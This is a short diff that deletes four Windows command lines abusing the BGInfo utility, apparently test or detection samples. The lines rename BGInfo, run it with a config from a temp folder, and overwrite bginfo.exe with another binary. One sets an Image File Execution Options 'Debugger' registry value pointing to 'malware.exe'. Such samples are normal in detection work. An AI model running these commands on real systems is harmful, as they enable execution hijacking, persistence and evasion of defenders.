@@ -1,4 +1,0 @@
-copy Bginfo.exe bg_update.exe && bg_update.exe C:\Windows\Temp\config.bgi /popup /nolicprompt
-Bginfo64.exe /popup /i:config.bgi /timer:0
-copy calc.exe bginfo.exe && bginfo.exe
-reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\bginfo.exe" /v Debugger /t REG_SZ /d "malware.exe"
